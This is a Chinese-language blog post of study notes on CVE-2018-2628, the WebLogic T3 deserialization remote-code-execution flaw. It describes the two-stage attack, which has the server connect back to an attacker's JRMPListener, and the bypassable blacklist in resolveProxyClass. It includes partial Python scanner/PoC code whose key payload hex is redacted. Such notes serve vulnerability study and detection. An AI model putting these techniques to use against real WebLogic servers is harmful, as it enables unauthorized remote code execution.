# CVE-2018-2628 weblogic WLS反序列化漏洞 - 斑林鸽的代码世界 - 博客园

> 原文：[https://www.cnblogs.com/mutudou/p/14652876.html](https://www.cnblogs.com/mutudou/p/14652876.html)

# weblogic WLS 反序列化漏洞学习

* * *

## 漏洞简介 ## *** + 漏洞威胁：RCE--远程代码执行 + 漏洞组件：weblogic + 影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3 + 温馨提示：对于攻击者自己构造的新的payload，还没有被oracle加入黑名单，所以还是多加留心、持续监控的好。

## 漏洞复现

* * *

*   我保存了python漏扫脚本，重命名为weblogic2628.py；
*   使用命令python weblogic2628.py （目标在脚本代码内修改了）探测发现存在漏洞；
*   由于漏洞环境不能控制，没有做进一步测试；
    ![](../Images/93d2ce66682f1449fc9893942ced763b.png)

**根据大佬分析文档中的步骤，援引如下：**

+ 首先利用weblogic的T3或者T3S协议（目标端口7001）进行握手尝试，如果握手成功，发送第一步payload； ![](https://images2018.cnblogs.com/blog/1070321/201804/1070321-20180418142538960-2109398262.png) + 第一步payload，T3服务会解包Object结果，然后通过java反序列化最倒霉的函数readObject函数层层反序列化，去请求攻击者服务器的1099端口，下载恶意payload；借用大神一张图： ![](https://images2018.cnblogs.com/blog/1070321/201804/1070321-20180418142730658-294636473.png) + 第二步，攻击者在自己的服务器上启用ysoserial.exploit.JRMPListener，JRMPListener会将含有恶意代码的payload发送回请求方，这里就是的恶意Payload就是任意代码执行的恶意代码； + 援引大神的话：查看weblogic日志，并且可以弹出计算器，借大神一张图：

![](../Images/7610e2d1ba73acbd58293f76ae0628ee.png)

## 漏洞分析部分学习笔记

* * *

```
protected Class<?> resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException {
   String[] arr$ = interfaces;
   int len$ = interfaces.length;

   for(int i$ = 0; i$ < len$; ++i$) {
      String intf = arr$[i$];
      if(intf.equals("java.rmi.registry.Registry")) {
         throw new InvalidObjectException("Unauthorized proxy deserialization");
      }
   }

   return super.resolveProxyClass(interfaces);
} 
```

**上边放上了源码：来看看InboundMsgAbbrev中resolveProxyClass的实现，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry，其实随便找一个rmi接口即可绕过。**

大概意思应该是，只判断是否是RMI接口，如果是就OK，没有做其他的权限检查，或可信检查，导致攻击者自己起一个RMI接口，就可以引导weblogic去请求自己存好的恶意代码段；这个恶意代码是利用JRMP加载回来的利用readObject解析的，从而达到了RCE的目的。对于JRMP的解析可以看下大神的原话：

**核心部分就是JRMP（Java Remote Methodprotocol），在这个PoC中会序列化一个RemoteObjectInvocationHandler，它会利用UnicastRef建立到远端的tcp连接获取RMI registry，加载回来再利用readObject解析，从而造成反序列化远程代码执行。**

## poc简要分析（隐去关键十六进制payload部分）

* * *

```
def run(dip,dport,index):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
    sock.settimeout(65)
    server_addr = (dip, dport)
    t3handshake(sock,server_addr)
    buildT3RequestObject(sock,dport)
    rs=sendEvilObjData(sock,PAYLOAD[index])
    print 'rs',rs
    checkVul(rs,server_addr,index) 
```

```
def t3handshake(sock,server_addr):
    sock.connect(server_addr)
    sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
    time.sleep(1)
    sock.recv(1024)
    print 'handshake successful' 
```

```
def buildT3RequestObject(sock,port):
    data1 = ''
    data2 = ''.format('{:04x}'.format(dport))
    data3 = ''
    data4 = ''
    for d in [data1,data2,data3,data4]:
        sock.send(d.decode('hex'))
    time.sleep(2)
    print 'send request payload successful,recv length:%d'%(len(sock.recv(2048)))

def sendEvilObjData(sock,data):
    payload=''
    payload+=data  
    payload+=''
    payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)
    sock.send(payload.decode('hex'))
    time.sleep(2)
    sock.send(payload.decode('hex'))
    res = ''
    try:
        while True:
            res += sock.recv(4096)
            time.sleep(0.1)
    except Exception as e:
        pass
    return res

def checkVul(res,server_addr,index):
    p=re.findall(VER_SIG[index], res, re.S)
    if len(p)>0:
        print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index])
    else:
        print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index]) 
```

看一下基本过程就是先进行T3的握手，成功了就发送第一步的payload，然后发送RequestObject，尝试让weblogic反连自己，然后发送恶意数据，通过回显判定恶意特征串来判定是否存在漏洞。